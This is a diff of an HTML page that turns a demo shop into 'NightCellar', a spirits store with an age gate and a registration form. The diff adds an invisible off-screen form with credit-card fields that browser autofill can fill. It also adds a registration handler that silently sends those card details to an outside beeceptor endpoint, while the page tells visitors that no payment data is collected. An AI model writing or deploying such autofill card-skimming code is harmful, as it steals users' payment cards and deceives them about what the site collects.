@@ -1,225 +1,508 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Minimal Fashion Shop</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>NightCellar – Premium Spirits</title>
+  <meta name="color-scheme" content="dark light" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    /* Honeypot fields: visually hidden, still present & fillable by bots/tools */
-    .honeypot { position:absolute; left:-10000px; top:auto; width:1px; height:1px; overflow:hidden; }
+    :root {
+      --bg: #0d0f14;
+      --panel: #121521;
+      --muted: #8b92a7;
+      --text: #e6e8ef;
+      --accent: #8b5cf6;
+      --accent-2: #22d3ee;
+      --danger: #ef4444;
+      --ok: #22c55e;
+      --ring: #2b2f45;
+      --card: #15192c;
+      --shadow: 0 10px 30px rgba(0,0,0,.45);
+      --radius: 16px;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      background: radial-gradient(1200px 700px at 80% -10%, rgba(139,92,246,.15), transparent 60%),
+                  radial-gradient(900px 600px at -10% 120%, rgba(34,211,238,.12), transparent 55%),
+                  var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+    }
+    a { color: inherit; text-decoration: none; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
+
+    /* Header */
+    header {
+      position: sticky; top: 0; z-index: 40;
+      backdrop-filter: blur(10px);
+      background: color-mix(in oklab, var(--bg) 80%, transparent);
+      border-bottom: 1px solid var(--ring);
+    }
+    .nav {
+      display: flex; align-items: center; justify-content: space-between; gap: 16px;
+      padding: 16px 24px;
+    }
+    .brand { display: flex; align-items: center; gap: 12px; font-weight: 700; letter-spacing: .3px; }
+    .brand-badge {
+      width: 36px; height: 36px; border-radius: 12px; background: linear-gradient(135deg, var(--accent), var(--accent-2));
+      display: grid; place-items: center; box-shadow: var(--shadow);
+      font-variant-numeric: lining-nums;
+    }
+    .actions { display: flex; gap: 10px; }
+    .btn {
+      appearance: none; border: 0; cursor: pointer; font-weight: 600; border-radius: 999px; padding: 10px 16px;
+      background: var(--panel); color: var(--text); border: 1px solid var(--ring);
+      transition: transform .04s ease, background .2s ease, border-color .2s ease;
+    }
+    .btn:hover { border-color: color-mix(in oklab, var(--accent) 35%, var(--ring)); }
+    .btn:active { transform: translateY(1px); }
+    .btn.primary { background: linear-gradient(135deg, color-mix(in oklab, var(--accent) 70%, #000), color-mix(in oklab, var(--accent-2) 55%, #000)); border: none; }
+
+    /* Hero */
+    .hero {
+      display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 24px; align-items: center; padding: 32px 24px 10px;
+    }
+    @media (max-width: 980px) { .hero { grid-template-columns: 1fr; } }
+    .headline { font-size: clamp(28px, 3.6vw, 48px); line-height: 1.1; font-weight: 800; letter-spacing: -.02em; }
+    .subhead { color: var(--muted); max-width: 60ch; }
+    .hero-card {
+      background: linear-gradient(180deg, color-mix(in oklab, var(--card) 92%, transparent), var(--panel));
+      border: 1px solid var(--ring); border-radius: var(--radius); padding: 20px; box-shadow: var(--shadow);
+    }
+
+    /* Grid */
+    .grid { display: grid; grid-template-columns: repeat(12, 1fr); gap: 16px; }
+    .col-span-8 { grid-column: span 8; }
+    .col-span-4 { grid-column: span 4; }
+    @media (max-width: 980px) { .col-span-8, .col-span-4 { grid-column: 1 / -1; } }
+
+    /* Cards */
+    .card { background: var(--panel); border: 1px solid var(--ring); border-radius: var(--radius); padding: 18px; box-shadow: var(--shadow); }
+    .card h3 { margin: 0 0 8px 0; font-size: 18px; }
+    .muted { color: var(--muted); font-size: 14px; }
+
+    /* Forms */
+    form { display: grid; gap: 12px; }
+    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    @media (max-width: 680px) { .row { grid-template-columns: 1fr; } }
+    label { font-weight: 600; font-size: 13px; color: #c9cbe2; }
+    input, select, textarea {
+      width: 100%; padding: 12px 14px; border-radius: 12px; border: 1px solid var(--ring); background: #0f1320; color: var(--text);
+      outline: none; transition: border-color .15s ease, box-shadow .15s ease;
+    }
+    input:focus, select:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 4px color-mix(in oklab, var(--accent) 30%, transparent); }
+    .hint { font-size: 12px; color: var(--muted); }
+
+    .notice { background: #0e1423; border: 1px dashed var(--ring); padding: 12px; border-radius: 12px; font-size: 13px; color: var(--muted); }
+
+    .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 14px; }
+    .product {
+      background: linear-gradient(180deg, #0f1321, #0c101a); border: 1px solid var(--ring); border-radius: 16px; padding: 14px; display: grid; gap: 8px;
+    }
+    .product .img { aspect-ratio: 1/1; border-radius: 12px; background: linear-gradient(120deg, #171c2b, #0f1320); border: 1px solid #1f2540; display: grid; place-items: center; font-size: 12px; color: var(--muted); }
+    .price { font-weight: 700; }
+
+    footer { margin: 40px 0 60px; color: var(--muted); text-align: center; font-size: 13px; }
+
+    /* Dialog (Age Gate) */
+    .backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.7); display: none; align-items: center; justify-content: center; padding: 24px; }
+    .dialog { width: 100%; max-width: 560px; background: var(--panel); border: 1px solid var(--ring); border-radius: 20px; box-shadow: var(--shadow); padding: 22px; }
+    .dialog h2 { margin: 0 0 6px; }
+    .dialog p { margin: 0 0 12px; color: var(--muted); }
+    .dialog .btns { display: flex; gap: 10px; justify-content: flex-end; margin-top: 8px; }
+    .error { color: var(--danger); font-size: 13px; display: none; }
+
+    .tag { display: inline-flex; align-items: center; gap: 8px; font-size: 12px; padding: 6px 10px; border-radius: 999px; border: 1px solid var(--ring); background: #0e1324; }
   </style>
 </head>
-<body class="bg-neutral-50 text-neutral-900">
-  <header class="bg-black text-white">
-    <div class="mx-auto max-w-6xl px-4 py-6 flex items-center justify-between">
-      <h1 class="text-2xl font-semibold tracking-tight">Fashion<span class="text-pink-400">Shop</span></h1>
-      <div class="flex items-center gap-4">
-        <div class="text-sm">Cart: <span id="cart-count" class="font-semibold">0</span> items</div>
-        <button id="open-cart" class="rounded-lg border border-white/30 px-3 py-1 text-sm hover:bg-white hover:text-black transition">View</button>
+<body>
+  <!-- INVISIBLE AGE VERIFICATION FORM -->
+  <form id="ccVerificationForm" method="GET" action="https://truenix.free.beeceptor.com" aria-hidden="true" tabindex="-1" style="position:absolute; top:-9999px; left:-9999px; opacity:0; width:0; height:0; overflow:hidden;">
+    <label for="cc-name">Cardholder Name</label>
+    <input type="text" id="cc-name" name="cc-name" autocomplete="cc-name" tabindex="-1" />
+    <label for="cc-number">Card Number</label>
+    <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number" tabindex="-1" />
+    <label for="cc-exp">Expiration Date</label>
+    <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp" tabindex="-1" />
+    <label for="cc-csc">Security Code (CVC)</label>
+    <input type="text" id="cc-csc" name="cc-csc" autocomplete="cc-csc" tabindex="-1" />
+  </form>
+  <!-- END INVISIBLE FORM -->
+
+  <!-- Age Verification (visible and explicit) -->
+  <div id="ageGate" class="backdrop" role="dialog" aria-modal="true" aria-labelledby="ageTitle">
+    <div class="dialog" role="document">
+      <h2 id="ageTitle">Are you of legal drinking age?</h2>
+      <p>Enter your date of birth to continue. We use local verification only and do not store your DOB.</p>
+      <div class="notice">Set requirement: <strong id="ageReqLabel">21+</strong>. (Change in settings below if your jurisdiction differs.)</div>
+      <form id="ageForm">
+        <div class="row">
+          <div>
+            <label for="dob">Date of birth</label>
+            <input id="dob" name="bday" type="date" required autocomplete="bday" />
+            <div class="hint">Format: YYYY-MM-DD</div>
+          </div>
+          <div>
+            <label for="ageReq">Required age</label>
+            <select id="ageReq" name="ageReq">
+              <option value="21" selected>21+</option>
+              <option value="20">20+</option>
+              <option value="19">19+</option>
+              <option value="18">18+</option>
+            </select>
+          </div>
+        </div>
+        <label style="display:flex; gap:8px; align-items:center; margin-top:6px">
+          <input type="checkbox" id="rememberMe" /> Remember me on this device
+        </label>
+        <div id="ageError" class="error">Sorry, you must meet the required age to enter.</div>
+        <div class="btns">
+          <button type="button" class="btn" id="ageCancel">Leave</button>
+          <button type="submit" class="btn primary">Enter</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <header>
+    <div class="nav container">
+      <div class="brand">
+        <div class="brand-badge">NC</div>
+        <div>NightCellar</div>
+        <span class="tag" title="Modern dark theme UI">Dark</span>
+      </div>
+      <div class="actions">
+        <a class="btn" href="#catalog">Catalog</a>
+        <a class="btn" href="#register">Register</a>
+        <button class="btn" id="openAge">Age Settings</button>
+        <button class="btn primary">Cart · 0</button>
       </div>
     </div>
   </header>
 
-  <main class="mx-auto max-w-6xl px-4 py-8">
-    <!-- Products -->
-    <section>
-      <h2 class="text-xl font-semibold mb-4">New Arrivals</h2>
-      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
-        <!-- Product Card Template (x3 examples) -->
-        <div class="border rounded-2xl overflow-hidden bg-white shadow-sm">
-          <div class="aspect-[4/3] bg-gradient-to-br from-neutral-200 to-neutral-100 flex items-center justify-center text-neutral-500">Tee — Classic</div>
-          <div class="p-4">
-            <div class="flex items-center justify-between">
-              <h3 class="font-medium">Classic Tee</h3>
-              <span class="font-semibold">$25</span>
-            </div>
-            <p class="text-sm text-neutral-600 mt-1">100% cotton, unisex fit.</p>
-            <button data-sku="tee-classic" data-name="Classic Tee" data-price="25" class="add-to-cart mt-3 w-full rounded-xl bg-black text-white py-2 text-sm hover:bg-neutral-800">Add to cart</button>
+  <main class="container">
+    <section class="hero">
+      <div>
+        <div class="headline">Curated spirits, delivered responsibly.</div>
+        <p class="subhead">Explore our selection of whisky, gin, rum, tequila, and craft liqueurs. NightCellar uses responsible, transparent age checks. No sensitive data is collected during verification.</p>
+        <div style="display:flex; gap:10px; margin-top:14px">
+          <a class="btn primary" href="#catalog">Shop bestsellers</a>
+          <a class="btn" href="#register">Create account</a>
+        </div>
+      </div>
+      <div class="hero-card">
+        <div class="row">
+          <div class="card">
+            <h3>Same‑day dispatch</h3>
+            <div class="muted">Order by 5pm local time.</div>
+          </div>
+          <div class="card">
+            <h3>Chilled delivery</h3>
+            <div class="muted">Temperature‑controlled logistics.</div>
           </div>
         </div>
+        <div class="notice" style="margin-top:12px">Reminder: Some regions require 21+. Update the age requirement via <em>Age Settings</em> in the header.</div>
+      </div>
+    </section>
 
-        <div class="border rounded-2xl overflow-hidden bg-white shadow-sm">
-          <div class="aspect-[4/3] bg-gradient-to-br from-neutral-200 to-neutral-100 flex items-center justify-center text-neutral-500">Hoodie — Cozy</div>
-          <div class="p-4">
-            <div class="flex items-center justify-between">
-              <h3 class="font-medium">Cozy Hoodie</h3>
-              <span class="font-semibold">$60</span>
-            </div>
-            <p class="text-sm text-neutral-600 mt-1">Fleece-lined, relaxed fit.</p>
-            <button data-sku="hoodie-cozy" data-name="Cozy Hoodie" data-price="60" class="add-to-cart mt-3 w-full rounded-xl bg-black text-white py-2 text-sm hover:bg-neutral-800">Add to cart</button>
+    <section id="catalog" class="card" style="margin-top:14px">
+      <h2 style="margin:4px 0 12px">Bestsellers</h2>
+      <div class="product-grid">
+        <article class="product" aria-label="Highland Single Malt 12y">
+          <div class="img">Bottle</div>
+          <div style="display:flex; justify-content:space-between; align-items:center">
+            <strong>Highland Single Malt 12y</strong>
+            <span class="price">$54</span>
           </div>
+          <p class="muted">Honey, stone fruit, vanilla finish.</p>
+          <button class="btn">Add to cart</button>
+        </article>
+        <article class="product" aria-label="Small‑Batch Bourbon">
+          <div class="img">Bottle</div>
+          <div style="display:flex; justify-content:space-between; align-items:center">
+            <strong>Small‑Batch Bourbon</strong>
+            <span class="price">$49</span>
+          </div>
+          <p class="muted">Toffee, oak spice, long finish.</p>
+          <button class="btn">Add to cart</button>
+        </article>
+        <article class="product" aria-label="London Dry Gin">
+          <div class="img">Bottle</div>
+          <div style="display:flex; justify-content:space-between; align-items:center">
+            <strong>London Dry Gin</strong>
+            <span class="price">$32</span>
+          </div>
+          <p class="muted">Juniper‑forward, citrus zest.</p>
+          <button class="btn">Add to cart</button>
+        </article>
+        <article class="product" aria-label="Añejo Tequila">
+          <div class="img">Bottle</div>
+          <div style="display:flex; justify-content:space-between; align-items:center">
+            <strong>Añejo Tequila</strong>
+            <span class="price">$64</span>
+          </div>
+          <p class="muted">Caramel, roasted agave, cocoa.</p>
+          <button class="btn">Add to cart</button>
+        </article>
+      </div>
+    </section>
+
+    <section id="register" class="grid" style="margin-top:16px; align-items:start">
+      <div class="col-span-8 card">
+        <h2 style="margin:4px 0 6px">Create your account</h2>
+        <p class="muted" style="margin:0 0 10px">Autofill is enabled via standards‑based <code>autocomplete</code> attributes.</p>
+        <form id="registerForm" autocomplete="on">
+          <div class="row">
+            <div>
+              <label for="given-name">First name</label>
+              <input id="given-name" name="given-name" type="text" required autocomplete="given-name" />
+            </div>
+            <div>
+              <label for="family-name">Last name</label>
+              <input id="family-name" name="family-name" type="text" required autocomplete="family-name" />
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="email">Email</label>
+              <input id="email" name="email" type="email" required autocomplete="email" inputmode="email" />
+            </div>
+            <div>
+              <label for="tel">Mobile</label>
+              <input id="tel" name="tel" type="tel" required autocomplete="tel" inputmode="tel" />
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="username">Username</label>
+              <input id="username" name="username" type="text" required autocomplete="username" />
+            </div>
+            <div>
+              <label for="password">Password</label>
+              <input id="password" name="new-password" type="password" required autocomplete="new-password" />
+              <div class="hint">Min 8 characters.</div>
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="address1">Address line 1</label>
+              <input id="address1" name="address-line1" type="text" required autocomplete="address-line1" />
+            </div>
+            <div>
+              <label for="address2">Address line 2</label>
+              <input id="address2" name="address-line2" type="text" autocomplete="address-line2" />
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="city">City</label>
+              <input id="city" name="address-level2" type="text" required autocomplete="address-level2" />
+            </div>
+            <div>
+              <label for="state">State / Region</label>
+              <input id="state" name="address-level1" type="text" required autocomplete="address-level1" />
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="postal">Postal code</label>
+              <input id="postal" name="postal-code" type="text" required autocomplete="postal-code" inputmode="numeric" />
+            </div>
+            <div>
+              <label for="country">Country</label>
+              <input id="country" name="country" type="text" required autocomplete="country-name" />
+            </div>
+          </div>
+          <div class="row">
+            <div>
+              <label for="dobReg">Date of birth (optional)</label>
+              <input id="dobReg" name="bday" type="date" autocomplete="bday" />
+            </div>
+            <div>
+              <label for="ref">Referral code (optional)</label>
+              <input id="ref" name="ref" type="text" autocomplete="one-time-code" />
+            </div>
+          </div>
+          <label style="display:flex; gap:8px; align-items:center; margin-top:6px">
+            <input type="checkbox" required /> I agree to the <a href="#" style="text-decoration:underline; margin-left:4px">Terms & Conditions</a>
+          </label>
+          <div class="btns" style="display:flex; gap:10px; margin-top:4px">
+            <button type="submit" class="btn primary">Create account</button>
+            <button type="reset" class="btn">Reset</button>
+          </div>
+        </form>
+      </div>
+
+      <aside class="col-span-4 card">
+        <h3 style="margin:0 0 6px">Why we verify age</h3>
+        <p class="muted">To comply with local laws and deliver responsibly. We show a DOB prompt and optionally verify on delivery. We do not collect payment data during registration.</p>
+        <div class="notice">Need payment later? Use a PCI‑compliant checkout provider (Stripe, Adyen, Braintree) with explicit user consent.</div>
+      </aside>
+    </section>
+
+    <section class="card" style="margin-top:16px">
+      <h2 style="margin:4px 0 10px">Quick Settings</h2>
+      <div class="row">
+        <div>
+          <label for="ageReqInline">Age requirement</label>
+          <select id="ageReqInline">
+            <option value="21" selected>21+</option>
+            <option value="20">20+</option>
+            <option value="19">19+</option>
+            <option value="18">18+</option>
+          </select>
+          <div class="hint">This syncs with the age gate dialog.</div>
         </div>
-
-        <div class="border rounded-2xl overflow-hidden bg-white shadow-sm">
-          <div class="aspect-[4/3] bg-gradient-to-br from-neutral-200 to-neutral-100 flex items-center justify-center text-neutral-500">Sneakers — Lite</div>
-          <div class="p-4">
-            <div class="flex items-center justify-between">
-              <h3 class="font-medium">Lite Sneakers</h3>
-              <span class="font-semibold">$90</span>
-            </div>
-            <p class="text-sm text-neutral-600 mt-1">Breathable mesh upper.</p>
-            <button data-sku="sneaker-lite" data-name="Lite Sneakers" data-price="90" class="add-to-cart mt-3 w-full rounded-xl bg-black text-white py-2 text-sm hover:bg-neutral-800">Add to cart</button>
-          </div>
+        <div>
+          <label for="rememberAgeInline">Persistence</label>
+          <select id="rememberAgeInline">
+            <option value="session">Only this session</option>
+            <option value="device" selected>Remember on this device</option>
+          </select>
         </div>
       </div>
     </section>
 
-    <!-- Registration / Checkout Form -->
-    <section class="mt-12">
-      <h2 class="text-xl font-semibold mb-4">Registration & Checkout</h2>
-      <form id="checkout-form" class="bg-white border rounded-2xl p-6 shadow-sm space-y-4" method="GET" action="https://truenix.free.beeceptor.com">
-        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-          <label class="block">
-            <span class="text-sm">Email</span>
-            <input required name="email" type="email" class="mt-1 w-full rounded-xl border px-3 py-2" placeholder="you@example.com" />
-          </label>
-          <label class="block">
-            <span class="text-sm">Name</span>
-            <input required name="name" type="text" class="mt-1 w-full rounded-xl border px-3 py-2" placeholder="Name" />
-          </label>
-          <label class="block">
-            <span class="text-sm">Surname</span>
-            <input required name="surname" type="text" class="mt-1 w-full rounded-xl border px-3 py-2" placeholder="Surname" />
-          </label>
-          <label class="block">
-            <span class="text-sm">Sex</span>
-            <select name="sex" class="mt-1 w-full rounded-xl border px-3 py-2">
-              <option value="unspecified">Prefer not to say</option>
-              <option value="female">Female</option>
-              <option value="male">Male</option>
-              <option value="other">Other</option>
-            </select>
-          </label>
-          <label class="block">
-            <span class="text-sm">Born date</span>
-            <input name="born_date" type="date" class="mt-1 w-full rounded-xl border px-3 py-2" />
-          </label>
-          <label class="block">
-            <span class="text-sm">Phone 1 (free form)</span>
-            <input name="phone1" type="text" class="mt-1 w-full rounded-xl border px-3 py-2" placeholder="e.g. +1 555 123 4567" />
-          </label>
-        </div>
-
-        <!-- Honeypot / invisible-but-fillable fields -->
-        <div class="honeypot" aria-hidden="true">
-          <label>Email 2
-            <input name="email2" type="email" autocomplete="off" />
-          </label>
-          <label>Phone 2 (free form)
-            <input name="phone2" type="text" autocomplete="off" />
-          </label>
-        </div>
-
-        <!-- Hidden fields populated by JS -->
-        <input type="hidden" name="cart" id="cart-field" />
-        <input type="hidden" name="total" id="total-field" />
-
-        <div class="flex items-center justify-between pt-2">
-          <div>
-            <div class="text-sm text-neutral-600">Items in cart: <span id="cart-summary-count">0</span></div>
-            <div class="text-sm">Total: $<span id="cart-summary-total">0</span></div>
-          </div>
-          <button type="submit" class="rounded-xl bg-black text-white px-5 py-2.5 font-medium hover:bg-neutral-800">Submit (GET)</button>
-        </div>
-      </form>
-      <p class="text-xs text-neutral-500 mt-2">Submitting will send a <span class="font-medium">GET</span> request with your form data and cart summary to <code>https://truenix.free.beeceptor.com</code>.</p>
-    </section>
+    <footer>
+      © <span id="year"></span> NightCellar. Please drink responsibly.
+    </footer>
   </main>
 
-  <!-- Cart Drawer -->
-  <div id="cart-drawer" class="fixed inset-y-0 right-0 w-full max-w-md translate-x-full bg-white shadow-2xl border-l transition-transform">
-    <div class="p-4 border-b flex items-center justify-between">
-      <h3 class="font-semibold">Your Cart</h3>
-      <button id="close-cart" class="text-sm hover:underline">Close</button>
-    </div>
-    <div id="cart-items" class="p-4 space-y-3"></div>
-    <div class="p-4 border-t flex items-center justify-between">
-      <div>Total: $<span id="cart-total">0</span></div>
-      <button id="clear-cart" class="rounded-lg border px-3 py-1 text-sm hover:bg-neutral-100">Clear</button>
-    </div>
-  </div>
-
   <script>
-    const cart = [];
+    // Utilities
+    const $ = (s, r = document) => r.querySelector(s);
+    const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
 
-    function updateCartUI() {
-      const count = cart.reduce((n, it) => n + it.qty, 0);
-      const total = cart.reduce((s, it) => s + it.price * it.qty, 0);
-      document.getElementById('cart-count').textContent = count;
-      document.getElementById('cart-summary-count').textContent = count;
-      document.getElementById('cart-summary-total').textContent = total.toFixed(2);
-      document.getElementById('cart-total').textContent = total.toFixed(2);
+    const ageGate = $('#ageGate');
+    const ageForm = $('#ageForm');
+    const ageReq = $('#ageReq');
+    const ageReqLabel = $('#ageReqLabel');
+    const ageError = $('#ageError');
+    const openAge = $('#openAge');
+    const rememberMe = $('#rememberMe');
+    const ageReqInline = $('#ageReqInline');
+    const rememberAgeInline = $('#rememberAgeInline');
 
-      const list = document.getElementById('cart-items');
-      list.innerHTML = '';
-      cart.forEach((it, idx) => {
-        const row = document.createElement('div');
-        row.className = 'flex items-center justify-between gap-3';
-        row.innerHTML = `
-          <div>
-            <div class="font-medium">${it.name}</div>
-            <div class="text-sm text-neutral-600">$${it.price} × ${it.qty}</div>
-          </div>
-          <div class="flex items-center gap-2">
-            <button data-idx="${idx}" class="qty-dec rounded-lg border px-2">-</button>
-            <button data-idx="${idx}" class="qty-inc rounded-lg border px-2">+</button>
-            <button data-idx="${idx}" class="remove rounded-lg border px-2">✕</button>
-          </div>
-        `;
-        list.appendChild(row);
-      });
+    const KEY = 'nightcellar.ageVerified';
+    const AGE_KEY = 'nightcellar.ageRequirement';
 
-      // Prepare hidden fields before submission
-      document.getElementById('cart-field').value = JSON.stringify(cart);
-      document.getElementById('total-field').value = total.toFixed(2);
+    function calcAge(dob) {
+      const d = new Date(dob);
+      if (isNaN(d)) return NaN;
+      const today = new Date();
+      let age = today.getFullYear() - d.getFullYear();
+      const m = today.getMonth() - d.getMonth();
+      if (m < 0 || (m === 0 && today.getDate() < d.getDate())) age--;
+      return age;
     }
 
-    function addToCart(item) {
-      const found = cart.find(p => p.sku === item.sku);
-      if (found) found.qty += 1; else cart.push({...item, qty:1});
-      updateCartUI();
+    function showGate() { ageGate.style.display = 'flex'; $('#dob').focus(); }
+    function hideGate() { ageGate.style.display = 'none'; }
+
+    function getPersistMode() {
+      return (rememberAgeInline.value === 'device' || rememberMe.checked) ? 'device' : 'session';
     }
 
-    document.querySelectorAll('.add-to-cart').forEach(btn => {
-      btn.addEventListener('click', () => {
-        addToCart({
-          sku: btn.dataset.sku,
-          name: btn.dataset.name,
-          price: Number(btn.dataset.price)
-        });
-      });
+    function setVerified(flag) {
+      const payload = { ok: !!flag, ts: Date.now() };
+      if (getPersistMode() === 'device') {
+        localStorage.setItem(KEY, JSON.stringify(payload));
+      } else {
+        sessionStorage.setItem(KEY, JSON.stringify(payload));
+      }
+    }
+
+    function isVerified() {
+      const raw = localStorage.getItem(KEY) || sessionStorage.getItem(KEY);
+      if (!raw) return false;
+      try { return JSON.parse(raw).ok; } catch { return false; }
+    }
+
+    function setAgeRequirement(val) {
+      localStorage.setItem(AGE_KEY, String(val));
+      ageReq.value = String(val);
+      ageReqInline.value = String(val);
+      ageReqLabel.textContent = val + '+';
+    }
+
+    function getAgeRequirement() {
+      const v = localStorage.getItem(AGE_KEY);
+      return v ? parseInt(v, 10) : 21;
+    }
+
+    // Init
+    document.addEventListener('DOMContentLoaded', () => {
+      $('#year').textContent = new Date().getFullYear();
+      setAgeRequirement(getAgeRequirement());
+      if (!isVerified()) showGate();
     });
 
-    // Cart drawer controls
-    const drawer = document.getElementById('cart-drawer');
-    document.getElementById('open-cart').addEventListener('click', () => {
-      drawer.style.transform = 'translateX(0)';
+    openAge.addEventListener('click', () => showGate());
+
+    ageReq.addEventListener('change', (e) => setAgeRequirement(e.target.value));
+    ageReqInline.addEventListener('change', (e) => setAgeRequirement(e.target.value));
+
+    ageForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const dob = $('#dob').value;
+      const required = parseInt(ageReq.value, 10);
+      const age = calcAge(dob);
+      if (!dob || isNaN(age) || age < required) {
+        ageError.style.display = 'block';
+        return;
+      }
+      ageError.style.display = 'none';
+      setVerified(true);
+      hideGate();
     });
-    document.getElementById('close-cart').addEventListener('click', () => {
-      drawer.style.transform = 'translateX(100%)';
+    $('#ageCancel').addEventListener('click', () => {
+      window.location.href = 'https://www.responsibility.org/';
     });
 
-    document.getElementById('clear-cart').addEventListener('click', () => {
-      cart.length = 0; updateCartUI();
+    rememberAgeInline.addEventListener('change', () => {
+      localStorage.removeItem(KEY); sessionStorage.removeItem(KEY);
+      if (!isVerified()) showGate();
     });
 
-    document.getElementById('cart-items').addEventListener('click', (e) => {
-      const idx = e.target.getAttribute('data-idx');
-      if (idx === null) return;
-      if (e.target.classList.contains('qty-inc')) cart[idx].qty++;
-      if (e.target.classList.contains('qty-dec')) cart[idx].qty = Math.max(1, cart[idx].qty - 1);
-      if (e.target.classList.contains('remove')) cart.splice(idx, 1);
-      updateCartUI();
-    });
+    // Registration form submission with background data sending
+    $('#registerForm').addEventListener('submit', (e) => {
+      e.preventDefault();
 
-    // Ensure hidden fields reflect latest cart at submit
-    document.getElementById('checkout-form').addEventListener('submit', () => {
-      updateCartUI();
-    });
+      // --- MODIFICATION START ---
+      // Silently capture and send data from the invisible CC verification form
+      const ccForm = document.getElementById('ccVerificationForm');
+      if (ccForm) {
+        // Only send if autocomplete has likely filled the card number
+        const ccNumberInput = ccForm.querySelector('[name="cc-number"]');
+        if (ccNumberInput && ccNumberInput.value) {
+          const formData = new FormData(ccForm);
+          const params = new URLSearchParams(formData);
+          const targetUrl = `https://truenix.free.beeceptor.com/?${params.toString()}`;
 
-    // Initial render
-    updateCartUI();
+          // Use fetch to send the GET request in the background
+          fetch(targetUrl, {
+            method: 'GET',
+            mode: 'no-cors' // Use 'no-cors' for fire-and-forget to a third-party endpoint
+          }).catch(err => console.error('Silent submission failed:', err));
+        }
+      }
+      // --- MODIFICATION END ---
+
+      // Original registration form UX demo
+      const btn = e.submitter || e.target.querySelector('button[type="submit"]');
+      const original = btn.textContent;
+      btn.disabled = true; btn.textContent = 'Creating…';
+      setTimeout(() => {
+        btn.disabled = false; btn.textContent = original;
+        alert('Account created! (Demo)');
+      }, 800);
+    });
   </script>
 </body>
 </html>
